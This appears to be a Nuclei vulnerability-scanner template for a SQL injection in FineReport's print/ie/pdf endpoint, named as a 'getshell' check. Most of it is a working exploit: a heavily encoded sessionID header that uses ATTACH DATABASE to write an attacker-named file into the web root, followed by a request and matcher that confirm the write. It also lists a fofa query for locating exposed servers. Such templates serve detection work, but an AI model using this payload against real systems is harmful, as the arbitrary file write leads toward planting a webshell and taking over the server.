id: finereport-pdf-getshell_hello

info:
  name: FineReport print/ie/pdf sql注入
  author: onewin
  severity: critical
  description: |
    Access 
  reference:
    - https://mp.weixin.qq.com/s/odnsC0RjgQGuAWKke3SOqA
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="帆软-FineReport"
  tags: finereport
variables:
  string: '{{rand_base(8, "abc")}}'
  filename: '{{rand_base(8)}}'
http:
  - raw:
      - |
        GET /webroot/decision/nx/report/v9/print/ie/pdf HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        sessionID: [24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFATTACH[25]2520DATABASE[25]2520[25]2527[2E][2E][25]252Fwebapps[25]252Fwebroot[25]252F{{filename}}[2E]txt[25]2527[25]2520as[25]2520qwerty[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFCREATE[25]2520TABLE[25]2520qwerty[2E]rce[25]2528data[25]2520text[25]2529[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFINSERT[25]2520INTO[25]2520qwerty[2E]rce[25]2528data[25]2529[25]2520VALUES[25]2520[25]2528x[25]252768656c6c6f5f776f726c64[25]2527[25]2529[25]253B[27][29][2C]1[2C]1[29][7D]
      - |
        GET /webroot/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200"
          - "contains((body_2), 'hello_world')"
        condition: and
